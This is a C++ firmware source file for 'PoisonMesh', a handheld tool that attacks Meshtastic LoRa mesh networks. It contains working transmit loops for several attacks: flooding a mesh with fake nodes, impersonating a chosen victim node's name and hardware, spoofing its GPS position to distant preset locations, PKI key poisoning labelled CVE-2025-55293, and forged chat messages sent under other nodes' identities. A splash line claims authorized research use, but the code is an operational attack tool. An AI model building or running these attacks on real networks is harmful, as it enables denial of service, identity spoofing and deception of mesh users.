// ============================================================
//  main.cpp  -  PoisonMesh-Cardputer
// ============================================================
#include <Arduino.h>
#include <M5Unified.h>
#include <M5Cardputer.h>
#include <Wire.h>
#include <SPI.h>

#include "config.h"
#include "meshtastic_freq.h"
#include "meshtastic_proto.h"
#include "meshtastic_packets.h"
#include "meshtastic_parser.h"
#include "nodedb.h"
#include "screen_sniffer.h"
#include "ui.h"
#include "keyboard.h"
#include "radio.h"
#include "screensaver.h"

static uint32_t g_attacker_id = 0;

// ---- Estado del nodo fantasma (GhostMesh) ----------------
// Persiste durante toda la sesion de PoisonMesh.
static bool     g_ghost_exists = false;
static uint32_t g_ghost_id      = 0;
static char     g_ghost_long_name[24]  = "";
static char     g_ghost_short_name[5]  = "";
static uint32_t g_ghost_hw_model = 0;
static uint8_t  g_ghost_pub_key[32] = {0};  // X25519 (RAM, se pierde al reset)

void screen_attack_flood();
void screen_attack_meshgrow();
void screen_attack_meshmove();
void screen_attack_impersonator();
void screen_attack_namechange();
void screen_attack_position();
void screen_attack_pki_poison();
void screen_attack_chattymesh();
void screen_attack_ghostmesh();

// ---- Helpers UI ------------------------------------------
// Flag para saber si el fondo ya fue dibujado
static bool _attack_screen_init = false;
static const char* _attack_screen_name = nullptr;

static bool attack_running_screen(const char* name,
    uint32_t duration_ms, uint32_t& sent, uint32_t total)
{
    // Dibujar fondo y elementos estaticos solo la primera vez
    // o si cambio el nombre del ataque
    if (!_attack_screen_init || _attack_screen_name != name) {
        M5.Display.fillScreen(COL_BG);
        M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_DANGER);
        M5.Display.setTextDatum(MC_DATUM);
        M5.Display.drawString("[ ATAQUE ACTIVO ]", LCD_WIDTH/2, UI_HEADER_H/2);
        M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_DANGER);

        // Nombre del ataque (estatico)
        M5.Display.setFont(&fonts::FreeSans9pt7b);
        M5.Display.setTextColor(COL_TEXT);
        M5.Display.drawString(name, LCD_WIDTH/2, UI_HEADER_H + 16);

        // Info de canal (estatica)
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_TEXT_DIM);
        char info[48];
        snprintf(info, sizeof(info), "ch=0x%02X  %.3f MHz",
            mesh_channel_hash(g_loraCfg.presetIdx), g_loraCfg.freqMHz);
        M5.Display.drawString(info, LCD_WIDTH/2, UI_HEADER_H + 76);

        // Footer STOP (estatico)
        M5.Display.fillRect(0, LCD_HEIGHT - UI_FOOTER_H,
            LCD_WIDTH, UI_FOOTER_H, COL_DANGER);
        M5.Display.setTextColor(COL_TEXT);
        M5.Display.drawString("` = DETENER", LCD_WIDTH/2,
            LCD_HEIGHT - UI_FOOTER_H/2);

        _attack_screen_init = true;
        _attack_screen_name = name;
    }

    // Solo actualizar las zonas dinamicas (tiempo y contador)
    char buf[32];

    // Tiempo restante
    uint32_t remaining_s = duration_ms / 1000 + 1;
    snprintf(buf, sizeof(buf), "%lu s restantes  ", remaining_s);
    M5.Display.fillRect(0, UI_HEADER_H + 26, LCD_WIDTH, 16, COL_BG);
    M5.Display.setFont(&fonts::FreeSans9pt7b);
    M5.Display.setTextColor(COL_WARNING);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString(buf, LCD_WIDTH/2, UI_HEADER_H + 36);

    // Contador de enviados
    if (total > 0)
        snprintf(buf, sizeof(buf), "Enviados: %lu / %lu", sent, total);
    else
        snprintf(buf, sizeof(buf), "Enviados: %lu", sent);
    M5.Display.fillRect(0, UI_HEADER_H + 46, LCD_WIDTH, 16, COL_BG);
    M5.Display.setTextColor(COL_OK);
    M5.Display.drawString(buf, LCD_WIDTH/2, UI_HEADER_H + 56);

    screen_toggle_tick();
    KeyEvent ev = keyboard_read();
    if (ev.type == Key::Escape) {
        _attack_screen_init = false;  // resetear para proximo ataque
        return true;
    }
    delay(80);
    return false;
}

// Llamar al terminar un ataque para resetear el flag
static void attack_screen_reset() {
    _attack_screen_init = false;
}

static uint32_t screen_number_input(const char* label,
    uint32_t def, uint32_t mn, uint32_t mx)
{
    uint32_t val = def;
    while (true) {
        M5.Display.fillScreen(COL_BG);
        M5.Display.setFont(&fonts::FreeSans9pt7b);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.setTextDatum(MC_DATUM);
        M5.Display.drawString(label, LCD_WIDTH/2, 40);
        M5.Display.setTextColor(COL_ACCENT);
        M5.Display.setTextSize(2);
        char buf[16]; snprintf(buf, sizeof(buf), "%lu", val);
        M5.Display.drawString(buf, LCD_WIDTH/2, 70);
        M5.Display.setTextSize(1);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.drawString("Fn+,/=+/-1  Fn+;.=+/-10  Enter=OK",
            LCD_WIDTH/2, 110);
        KeyEvent ev = keyboard_wait();
        if (ev.type == Key::Left  && val > mn)        val--;
        if (ev.type == Key::Right && val < mx)        val++;
        if (ev.type == Key::Up    && val+10 <= mx)    val += 10;
        if (ev.type == Key::Down  && val >= mn+10)    val -= 10;
        if (ev.type == Key::Enter)  return val;
        if (ev.type == Key::Escape) return def;
    }
}

static bool screen_text_input(const char* prompt,
    char* buf, uint8_t maxLen)
{
    // Editor de texto multilinea. El buffer se reparte en varias filas
    // cortando por ancho fijo (char-wrap, no word-wrap) con fuente
    // monoespaciada Font0: asi se ve y se edita el mensaje completo
    // aunque supere el ancho de pantalla (mensajes de 200 bytes).
    const int AREA_X  = 4;
    const int AREA_Y  = UI_HEADER_H + 4;             // inicio del area de texto
    const int FOOT_Y  = LCD_HEIGHT - UI_FOOTER_H;    // inicio del footer
    const int AREA_W  = LCD_WIDTH - 2 * AREA_X;      // ancho util
    const int AREA_H  = FOOT_Y - AREA_Y - 2;         // alto util
    uint8_t curLen  = strlen(buf);
    int     lastLen = -1;  // forzar primer dibujo

    // Fondo + header con el prompt, dibujados UNA sola vez
    M5.Display.fillScreen(COL_BG);
    M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(COL_ACCENT);
    M5.Display.setTextDatum(ML_DATUM);
    M5.Display.drawString(prompt, 3, UI_HEADER_H / 2);
    M5.Display.drawFastHLine(0, UI_HEADER_H - 1, LCD_WIDTH, COL_ACCENT);

    // Fuente del area de edicion: FreeMono9pt7b (monoespaciada, mas
    // grande que Font0). Se miden las metricas del propio font para que
    // el corte por columnas sea exacto aunque se cambie la fuente.
    M5.Display.setFont(&fonts::FreeMono9pt7b);
    M5.Display.setTextSize(1);
    int CHAR_W  = M5.Display.textWidth("0"); if (CHAR_W < 1) CHAR_W = 11;
    int LINE_H  = M5.Display.fontHeight();   if (LINE_H < 1) LINE_H = 18;
    int COLS    = AREA_W / CHAR_W; if (COLS < 1) COLS = 1; if (COLS > 60) COLS = 60;
    int MAXROWS = AREA_H / LINE_H; if (MAXROWS < 1) MAXROWS = 1;

    while (true) {
        // Redibujar solo si el contenido cambio (cursor estatico, sin parpadeo)
        if ((int)curLen != lastLen) {
            // Fila donde cae el cursor (siempre al final del buffer)
            int curRow   = curLen / COLS;
            int curCol   = curLen % COLS;
            int totalRows = curRow + 1;
            // Scroll: si no entra, mostrar las ultimas MAXROWS filas
            int startRow = (totalRows > MAXROWS) ? (totalRows - MAXROWS) : 0;

            // Limpiar area de texto (sin tocar header ni footer)
            M5.Display.fillRect(0, UI_HEADER_H, LCD_WIDTH,
                FOOT_Y - UI_HEADER_H, COL_BG);

            M5.Display.setFont(&fonts::FreeMono9pt7b);
            M5.Display.setTextSize(1);
            M5.Display.setTextColor(COL_TEXT);
            M5.Display.setTextDatum(TL_DATUM);
            char line[64];
            for (int row = startRow; row < totalRows; row++) {
                int from = row * COLS;
                int n    = (int)curLen - from;
                if (n > COLS) n = COLS;
                if (n < 0)    n = 0;
                memcpy(line, buf + from, n);
                line[n] = '\0';
                M5.Display.drawString(line, AREA_X,
                    AREA_Y + (row - startRow) * LINE_H);
            }

            // Cursor (subrayado) en la celda del final del texto
            int cx = AREA_X + curCol * CHAR_W;
            int cy = AREA_Y + (curRow - startRow) * LINE_H;
            M5.Display.fillRect(cx, cy + LINE_H - 3, CHAR_W - 2, 2, COL_ACCENT);

            // Footer: ayuda + contador de caracteres (Font0, chico)
            M5.Display.fillRect(0, FOOT_Y, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
            M5.Display.setFont(&fonts::Font0);
            M5.Display.setTextSize(1);
            M5.Display.setTextColor(COL_TEXT_DIM);
            M5.Display.setTextDatum(ML_DATUM);
            M5.Display.drawString("Enter=OK  `=cancelar", 3,
                FOOT_Y + UI_FOOTER_H / 2);
            char cnt[12];
            snprintf(cnt, sizeof(cnt), "%u/%u",
                (unsigned)curLen, (unsigned)(maxLen - 1));
            M5.Display.setTextDatum(MR_DATUM);
            M5.Display.drawString(cnt, LCD_WIDTH - 3, FOOT_Y + UI_FOOTER_H / 2);

            lastLen = curLen;
        }

        // UNA sola lectura de teclado por iteracion. keyboard_edit_string
        // ya consume el evento e informa Enter (1) y Escape (-1).
        int r = keyboard_edit_string(buf, maxLen, &curLen);
        if (r == 1)  return true;
        if (r == -1) return false;

        delay(20);
    }
}

// Menu de seleccion de placa base
// Retorna el hw_model ID seleccionado, o 0 si ESC
static uint32_t screen_select_hw_model() {
    uint8_t selected   = 0;
    uint8_t scrollOff  = 0;
    const uint8_t ROW_H    = 16;
    const uint8_t VISIBLE  = (uint8_t)(UI_CONTENT_H / ROW_H);

    // Limpiar antes de entrar al selector (viene de screen_node_list con sprite)
    M5.Display.fillScreen(COL_BG);
    delay(50);

    while (true) {
        M5.Display.fillScreen(COL_BG);
        M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextSize(1);
        M5.Display.setTextColor(COL_ACCENT);
        M5.Display.setTextDatum(ML_DATUM);
        M5.Display.drawString("PM| Seleccionar placa", 3, UI_HEADER_H/2);
        M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);

        M5.Display.setFont(&fonts::Font0);
        for (uint8_t i = 0; i < VISIBLE; i++) {
            uint8_t idx = scrollOff + i;
            if (idx >= HW_MODELS_COUNT) break;
            int y = UI_CONTENT_Y + 2 + i * ROW_H;
            bool sel = (idx == selected);
            if (sel) M5.Display.fillRect(0, y, LCD_WIDTH, ROW_H-1, COL_SEL_BG);
            M5.Display.setTextColor(sel ? COL_ACCENT : COL_TEXT);
            M5.Display.setTextDatum(ML_DATUM);
            char row[32];
            snprintf(row, sizeof(row), "%s %s",
                sel ? ">" : " ", HW_MODELS[idx].name);
            M5.Display.drawString(row, 4, y + ROW_H/2);
            // ID a la derecha
            M5.Display.setTextColor(COL_TEXT_DIM);
            M5.Display.setTextDatum(MR_DATUM);
            char id_s[8]; snprintf(id_s, sizeof(id_s), "%lu", HW_MODELS[idx].id);
            M5.Display.drawString(id_s, LCD_WIDTH-2, y + ROW_H/2);
        }

        // Footer
        int fy = LCD_HEIGHT - UI_FOOTER_H;
        M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.setTextDatum(MC_DATUM);
        M5.Display.drawString("Fn+;.=nav  Enter=OK  `=cancelar",
            LCD_WIDTH/2, fy + UI_FOOTER_H/2);

        KeyEvent ev = keyboard_wait();
        if (ev.type == Key::Escape)  return 0;
        if (ev.type == Key::Enter)   return HW_MODELS[selected].id;
        if (ev.type == Key::Up   && selected > 0) {
            selected--;
            if (selected < scrollOff) scrollOff = selected;
        }
        if (ev.type == Key::Down && selected < HW_MODELS_COUNT-1) {
            selected++;
            if (selected >= scrollOff + VISIBLE)
                scrollOff = selected - VISIBLE + 1;
        }
    }
}

// ============================================================
void setup() {
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    Serial.begin(115200);
    delay(300);
    g_attacker_id = mesh_random_node_id();
    Serial.printf("[PoisonMesh] v" FW_VERSION " | ID: 0x%08X\n", g_attacker_id);
    Wire.begin(I2C_SDA, I2C_SCL);
    delay(50);
    screen_toggle_init();
    ui_init();
    // ---- Splash screen PoIsOnMeSh ----
    M5.Display.fillScreen(0x0000);  // negro total
    delay(200);

    // Fondo tenue con gradiente rojo oscuro
    for (int y = 0; y < LCD_HEIGHT; y++) {
        uint16_t c = M5.Display.color565(
            (y * 18) / LCD_HEIGHT,   // R: 0?18
            0, 0);                    // G,B = 0
        M5.Display.drawFastHLine(0, y, LCD_WIDTH, c);
    }

    // "PoIsOnMeSh" - letras grandes, verde veneno
    // Renderizado caracter a caracter alternando colores
    // para el efecto de "mezcla" del nombre
    struct GlyphStyle { const char* ch; uint16_t color; };
    static const GlyphStyle GLYPHS[] = {
        { "P",  M5.Display.color565(  0, 255,   0) },
        { "0",  M5.Display.color565(  0, 220,   0) },
        { "i",  M5.Display.color565(  0, 255,   0) },
        { "S",  M5.Display.color565(  0, 220,   0) },
        { "0",  M5.Display.color565(  0, 255,   0) },
        { "n",  M5.Display.color565(  0, 220,   0) },
        { "m",  M5.Display.color565(140, 140, 140) },
        { "E",  M5.Display.color565(110, 110, 110) },
        { "$",  M5.Display.color565(140, 140, 140) },
        { "H",  M5.Display.color565(110, 110, 110) },
    };
    static const uint8_t GLYPH_COUNT = 10;

    // "PoIsOn" - linea 1, verde brillante, grande
    M5.Display.setTextSize(2);
    M5.Display.setFont(&fonts::FreeSans9pt7b);
    int poison_w = 6 * 21;
    int poison_x = (LCD_WIDTH - poison_w) / 3;
    int poison_y = 8;

    for (uint8_t i = 0; i < 6; i++) {
        M5.Display.setTextColor(GLYPHS[i].color);
        M5.Display.setCursor(poison_x + i * 21, poison_y);
        M5.Display.print(GLYPHS[i].ch);
    }

    // "MeSh" - linea 2, gris
    M5.Display.setTextSize(2);
    int mesh_w = 4 * 20;
    int mesh_x = (LCD_WIDTH - mesh_w) / 2;
    int mesh_y = 40;

    for (uint8_t i = 6; i < GLYPH_COUNT; i++) {
        M5.Display.setTextColor(GLYPHS[i].color);
        M5.Display.setCursor(mesh_x + (i - 6) * 20, mesh_y);
        M5.Display.print(GLYPHS[i].ch);
    }

    // "by Teno"
    M5.Display.setTextSize(1);
    M5.Display.setFont(&fonts::FreeSans9pt7b);
    M5.Display.setTextColor(M5.Display.color565(90, 90, 90));
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("by Teno", LCD_WIDTH / 2, 80);

    // Linea separadora roja tenue
    M5.Display.drawFastHLine(20, 92, LCD_WIDTH - 40,
        M5.Display.color565(80, 0, 0));

    // Subtexto
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(M5.Display.color565(60, 60, 60));
    M5.Display.drawString("Meshtastic Security Research Tool",
        LCD_WIDTH / 2, 104);
    M5.Display.drawString("Authorized use only",
        LCD_WIDTH / 2, 116);

    // Parpadeo del texto "pulse una tecla"
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(M5.Display.color565(0, 180, 0));
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("[ pulse una tecla para continuar ]",
        LCD_WIDTH / 2, LCD_HEIGHT - 8);

    keyboard_wait();
}

void loop() {
    g_nodedb.clear();
    screen_lora_setup();

    Serial.printf("[PoisonMesh] %s | %s | %.3f MHz | ch_hash=0x%02X\n",
        REGIONS[g_loraCfg.regionIdx].name,
        PRESETS[g_loraCfg.presetIdx].name,
        g_loraCfg.freqMHz,
        mesh_channel_hash(g_loraCfg.presetIdx));

    M5.Display.fillScreen(COL_BG);
    M5.Display.setTextColor(COL_TEXT);
    M5.Display.setCursor(4, 4);
    M5.Display.print("Iniciando radio...");

    if (!radio_init(g_loraCfg)) {
        M5.Display.setTextColor(COL_DANGER);
        M5.Display.setCursor(4, 20);
        M5.Display.print("ERROR: SX1262");
        keyboard_wait();
        return;
    }

    M5.Display.setTextColor(COL_OK);
    M5.Display.setCursor(4, 20);
    M5.Display.printf("Radio OK: %.3f MHz", g_loraCfg.freqMHz);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.setCursor(4, 36);
    M5.Display.printf("ch_hash: 0x%02X", mesh_channel_hash(g_loraCfg.presetIdx));
    delay(800);

    radio_start_receive();

    while (true) {
        if (radio_packet_available()) {
            RawPacket pkt;
            if (radio_read_packet(pkt) == RadioResult::OK)
                g_nodedb.process_packet(pkt);
        }
        uint8_t choice = screen_main_menu();
        switch (choice) {
            case 0: screen_attack_flood();       break;
            case 1: screen_attack_meshgrow();    break;
            case 2: screen_attack_namechange();  break;
            case 3: screen_attack_position();    break;
            case 4: screen_attack_meshmove();       break;
            case 5: screen_attack_impersonator();  break;
            case 6: screen_attack_pki_poison();    break;
            case 7: screen_attack_chattymesh();    break;
            case 8: screen_attack_ghostmesh();     break;
            case 9: radio_sleep(); return;
            default: break;
        }
    }
}

// ============================================================
//  ATAQUES
// ============================================================

void screen_attack_flood() {
    uint8_t  ch          = mesh_channel_hash(g_loraCfg.presetIdx);
    uint8_t  preset      = g_loraCfg.presetIdx < 9 ? g_loraCfg.presetIdx : 5;
    uint32_t inter_delay = FLOOD_INTER_PKT_DELAY_MS[preset];

    // Elegir cantidad de nodos
    uint32_t node_count = screen_number_input("Cantidad de nodos", 50, 1, 1000);

    // Calcular y mostrar duracion minima antes de pedirla
    uint32_t min_s     = flood_min_duration_s(node_count, preset);
    uint32_t default_s = min_s + 5;

    M5.Display.fillScreen(COL_BG);
    M5.Display.setFont(&fonts::FreeSans9pt7b);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.setTextColor(COL_TEXT_DIM);
    char info[48];
    snprintf(info, sizeof(info), "%lu nodos / %s", node_count,
        PRESETS[preset].name);
    M5.Display.drawString(info, LCD_WIDTH/2, 35);
    M5.Display.setTextColor(COL_ACCENT);
    snprintf(info, sizeof(info), "Minimo: %lu seg", min_s);
    M5.Display.drawString(info, LCD_WIDTH/2, 55);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.drawString("Delay entre pkts incluido", LCD_WIDTH/2, 75);
    delay(2000);

    uint32_t duration_s = screen_number_input(
        "Duracion (seg)", default_s, min_s, 600);

    uint32_t sent = 0, dur_ms = duration_s*1000, start = millis();
    while (millis()-start < dur_ms && sent < node_count) {
        MeshTxPacket pkt = attack_flood_node(g_attacker_id, ch);
        if (pkt.valid) {
            radio_transmit(pkt.data, pkt.len);   // bloquea durante airtime
            sent++;
            Serial.printf("[Flood] %lu/%lu\n", sent, node_count);
            delay(inter_delay);                   // margen post-TX
        }
        if (attack_running_screen("Flood Nodes",
            dur_ms-(millis()-start), sent, node_count)) break;
    }
    radio_start_receive();
    M5.Display.fillScreen(COL_BG);
    M5.Display.setTextColor(COL_OK);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.setFont(&fonts::FreeSans9pt7b);
    char buf[32]; snprintf(buf, sizeof(buf), "Enviados: %lu", sent);
    M5.Display.drawString(buf, LCD_WIDTH/2, 60);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.drawString("Presiona cualquier tecla...", LCD_WIDTH/2, 90);
    keyboard_wait();
}

void screen_attack_namechange() {
    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);

    // 1. Seleccionar nodo victima
    int idx = screen_node_list("Namechange - Nodo", true);
    if (idx < 0) return;
    DiscoveredNode& t = g_nodedb.nodes[idx];

    // 2. Ingresar nombres nuevos (sin flickering)
    char nl[40] = "", ns[8] = "";
    strncpy(nl, t.long_name, 39); strncpy(ns, t.short_name, 7);
    if (!screen_text_input("Nombre largo:", nl, sizeof(nl)))  return;
    if (!screen_text_input("Nombre corto:", ns, sizeof(ns)))  return;

    // 3. Seleccionar placa base a suplantar
    uint32_t hw = screen_select_hw_model();
    if (hw == 0) hw = random_hw_model();  // ESC ? aleatorio

    // 4. Duracion
    uint32_t dur_s = screen_number_input("Duracion (seg)", 30, 5, 300);

    uint32_t sent=0, start=millis(), dur_ms=dur_s*1000;
    while (millis()-start < dur_ms) {
        // Construir User con la placa seleccionada
        uint8_t user_buf[128];
        char id_str[12];
        snprintf(id_str, sizeof(id_str), "!%08x", t.node_id);
        uint8_t mac[6] = {
            0x00, 0x11,
            (uint8_t)(t.node_id >> 24), (uint8_t)(t.node_id >> 16),
            (uint8_t)(t.node_id >> 8),  (uint8_t)(t.node_id)
        };
        ProtoWriter w(user_buf, sizeof(user_buf));
        w.write_field_string(1, id_str);
        w.write_field_string(2, nl);
        w.write_field_string(3, ns);
        w.write_field_bytes (4, mac, 6);
        w.write_field_uint32(5, hw);
        w.write_field_uint32(7, 1);  // role=CLIENT

        if (w.ok() && w.size() > 0) {
            MeshTxPacket pkt = mesh_build_packet(t.node_id, MESH_BROADCAST_ADDR,
                PORTNUM_NODEINFO, user_buf, w.size(),
                MESH_DEFAULT_HOP_LIMIT, ch);
            if (pkt.valid) { radio_transmit(pkt.data, pkt.len); sent++; }
        }
        if (attack_running_screen("Namechange", dur_ms-(millis()-start), sent, 0)) break;
    }
    attack_screen_reset();
    radio_start_receive();
}

void screen_attack_position() {
    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);

    // 1. Seleccionar nodo victima
    int idx = screen_node_list("Position Poison - Nodo", true);
    if (idx < 0) return;
    DiscoveredNode& t = g_nodedb.nodes[idx];

    // 2. Seleccionar destino predefinido
    struct Destination {
        const char* name;
        const char* coords;
        float lat; float lon; int32_t alt;
    };
    static const Destination DESTS[] = {
        { "Islas Malvinas",     " -51.79 / -59.52", -51.7963f,  -59.5236f,   0 },
        { "Egipto"," +29.97 / +31.13",  29.9792f,   31.1342f,  60 },
        { "Australia", " -25.27 /+133.77", -25.2744f,  133.7751f, 300 },
        { "Roma",               " +41.89 / +12.49",  41.8902f,   12.4922f,  21 },
    };
    static const uint8_t DEST_COUNT = 4;
    static const uint8_t ROW_H = 22;

    uint8_t dest_sel = 0;

    // CLS 
    M5.Display.fillScreen(COL_BG);
    
    delay(80);

    while (true) {
        M5.Display.fillScreen(COL_BG);
        M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_ACCENT);
        M5.Display.setTextDatum(ML_DATUM);
        M5.Display.drawString("PM| Destino", 3, UI_HEADER_H/2);
        M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);

        for (uint8_t i = 0; i < DEST_COUNT; i++) {
            int y = UI_CONTENT_Y + 4 + i * ROW_H;
            bool sel = (i == dest_sel);
            if (sel) M5.Display.fillRect(0, y, LCD_WIDTH, ROW_H-2, COL_SEL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextColor(sel ? COL_ACCENT : COL_TEXT);
            M5.Display.setTextDatum(ML_DATUM);
            char row[32]; snprintf(row, sizeof(row), "%s%s",
                sel ? "> " : "  ", DESTS[i].name);
            M5.Display.drawString(row, 2, y + 7);
            M5.Display.setFont(&fonts::Font0);
            M5.Display.setTextColor(sel ? COL_TEXT : COL_TEXT_DIM);
            M5.Display.drawString(DESTS[i].coords, 6, y + 17);
        }

        int fy = LCD_HEIGHT - UI_FOOTER_H;
        M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
        M5.Display.setFont(&fonts::Font0);
        M5.Display.setTextColor(COL_TEXT_DIM);
        M5.Display.setTextDatum(MC_DATUM);
        M5.Display.drawString("Fn+;.=nav  Enter=OK  `=cancelar",
            LCD_WIDTH/2, fy + UI_FOOTER_H/2);

        KeyEvent ev = keyboard_wait();
        if (ev.type == Key::Escape) return;
        if (ev.type == Key::Enter)  break;
        if (ev.type == Key::Up   && dest_sel > 0)            dest_sel--;
        if (ev.type == Key::Down && dest_sel < DEST_COUNT-1) dest_sel++;
    }

    // 3. Duracion
    uint32_t dur_s = screen_number_input("Duracion (seg)", 30, 5, 300);

    float flat = DESTS[dest_sel].lat;
    float flon = DESTS[dest_sel].lon;
    int32_t falt = DESTS[dest_sel].alt;

    uint32_t sent=0, start=millis(), dur_ms=dur_s*1000;
    while (millis()-start < dur_ms) {
        MeshTxPacket pkt = attack_position_poison(g_attacker_id,
            t.node_id, flat, flon, falt, ch);
        if (pkt.valid) { radio_transmit(pkt.data, pkt.len); sent++; }
        if (attack_running_screen("Position Poison",
            dur_ms-(millis()-start), sent, 0)) break;
    }
    attack_screen_reset();
    radio_start_receive();
}

void screen_attack_pki_poison() {
    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);
    int idx = screen_node_list("PKI Poison - Nodo", true);
    if (idx < 0) return;
    DiscoveredNode& t = g_nodedb.nodes[idx];
    M5.Display.fillScreen(COL_BG);
    M5.Display.setFont(&fonts::FreeSans9pt7b);
    M5.Display.setTextColor(COL_DANGER);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("CVE-2025-55293", LCD_WIDTH/2, 30);
    M5.Display.setTextColor(COL_WARNING);
    M5.Display.drawString("Nodo en ROJO en clientes", LCD_WIDTH/2, 52);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.drawString("Enter=OK  `=cancelar", LCD_WIDTH/2, 100);
    if (keyboard_wait().type == Key::Escape) return;
    uint32_t dur_s = screen_number_input("Duracion (seg)", 30, 5, 300);
    uint32_t sent=0, start=millis(), dur_ms=dur_s*1000;
    while (millis()-start < dur_ms) {
        MeshTxPacket pkt = attack_pki_poison(g_attacker_id, t.node_id,
            t.long_name, t.short_name, ch);
        if (pkt.valid) { radio_transmit(pkt.data, pkt.len); sent++; }
        if (attack_running_screen("PKI Poison", dur_ms-(millis()-start), sent, 0)) break;
    }
    attack_screen_reset();
    radio_start_receive();
}

// ============================================================
//  ChattyMesh - suplantacion de mensajes de texto aleatorios
//  Genera mensajes con caracteres y largo aleatorios, los envia
//  con el from de un nodo aleatorio de la lista, en loop continuo.
//  Toggle ON/OFF con Enter, salir con `
// ============================================================
void screen_attack_chattymesh() {
    uint8_t ch = mesh_channel_hash(g_loraCfg.presetIdx);

    bool     active  = false;
    uint32_t sent    = 0;
    uint32_t last_tx = 0;
    // Delay aleatorio entre mensajes: minimo 2s, maximo 6s
    const uint32_t INTERVAL_MIN_MS = 2000;
    const uint32_t INTERVAL_MAX_MS = 6000;
    uint32_t cur_interval_ms = INTERVAL_MIN_MS;  // se recalcula tras cada envio

    // Dibujar estaticos una sola vez
    M5.Display.fillScreen(COL_BG);
    M5.Display.fillRect(0, 0, LCD_WIDTH, UI_HEADER_H, COL_HEADER_BG);
    M5.Display.setFont(&fonts::Font0);
    M5.Display.setTextColor(COL_ACCENT);
    M5.Display.setTextDatum(ML_DATUM);
    M5.Display.drawString("PM| ChattyMesh", 3, UI_HEADER_H/2);
    M5.Display.drawFastHLine(0, UI_HEADER_H-1, LCD_WIDTH, COL_ACCENT);
    int fy = LCD_HEIGHT - UI_FOOTER_H;
    M5.Display.fillRect(0, fy, LCD_WIDTH, UI_FOOTER_H, COL_HEADER_BG);
    M5.Display.setTextColor(COL_TEXT_DIM);
    M5.Display.setTextDatum(MC_DATUM);
    M5.Display.drawString("Enter=ON/OFF   `=salir", LCD_WIDTH/2, fy + UI_FOOTER_H/2);

    bool     last_active = !active;
    uint32_t last_sent   = 0xFFFFFFFF;
    uint8_t  last_nodes  = 0xFF;

    // Conjunto de caracteres para los mensajes aleatorios
    static const char ALPHABET[] =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .!?";

    while (true) {
        uint8_t node_count = g_nodedb.count;

        // Procesar paquetes entrantes -> actualizar NodeDB
        if (radio_packet_available()) {
            RawPacket pkt;
            if (radio_read_packet(pkt) == RadioResult::OK)
                g_nodedb.process_packet(pkt);
        }

        // Redibujado selectivo anti-flickering
        if (active != last_active) {
            M5.Display.fillRect(0, UI_CONTENT_Y + 6, LCD_WIDTH, 20, COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextDatum(MC_DATUM);
            if (active) {
                M5.Display.setTextColor(COL_OK);
                M5.Display.drawString("[ ACTIVO ]", LCD_WIDTH/2, UI_CONTENT_Y + 18);
            } else {
                M5.Display.setTextColor(COL_TEXT_DIM);
                M5.Display.drawString("[ DETENIDO ]", LCD_WIDTH/2, UI_CONTENT_Y + 18);
            }
            last_active = active;
        }

        if (sent != last_sent) {
            char buf[32];
            snprintf(buf, sizeof(buf), "Mensajes: %lu", sent);
            M5.Display.fillRect(0, UI_CONTENT_Y + 30, LCD_WIDTH, 20, COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextDatum(MC_DATUM);
            M5.Display.setTextColor(sent > 0 ? COL_ACCENT : COL_TEXT_DIM);
            M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 42);
            last_sent = sent;
        }

        if (node_count != last_nodes) {
            char buf[32];
            snprintf(buf, sizeof(buf), "Nodos en rango: %u", node_count);
            M5.Display.fillRect(0, UI_CONTENT_Y + 54, LCD_WIDTH, 20, COL_BG);
            M5.Display.setFont(&fonts::FreeSans9pt7b);
            M5.Display.setTextDatum(MC_DATUM);
            M5.Display.setTextColor(COL_TEXT_DIM);
            M5.Display.drawString(buf, LCD_WIDTH/2, UI_CONTENT_Y + 66);
            last_nodes = node_count;
